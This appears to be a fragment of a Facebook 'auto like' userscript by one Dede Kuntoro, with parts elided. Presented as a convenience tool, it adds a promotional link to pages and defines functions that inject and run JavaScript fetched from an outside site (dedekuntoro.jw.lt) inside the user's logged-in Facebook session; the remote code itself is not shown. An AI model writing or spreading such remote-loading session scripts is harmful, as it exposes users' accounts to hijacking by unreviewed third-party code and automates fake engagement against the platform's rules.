// ==UserScript==
// @name			Dede Kuntoro Auto Like Facebook
// @namespace		      Auto_like_facebook
// @description		        Auto Like Edited by Dede Kuntoro
// @author			Dede Kuntoro
// @authorURL		        http://www.facebook.com/
// @homepage		        http://dedekuntoro.wordpress.com
...
// @updateURL   http://dedekuntoro.wapsite.me
...
if(body != null) {
	...
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='http://www.facebook.com/mujahidciber' title='Dede Kuntoro'><img src='http://i1338.photobucket.com/albums/o682/kaka_montague/jempol_zpsb4836a86.jpg' height='45' width='50'></img></a>"
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://dedekuntoro.jw.lt/fb/Foto/1.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://dedekuntoro.jw.lt/fb/Foto/2.js",b.body.appendChild(a);void(0);};}
body = document.body;
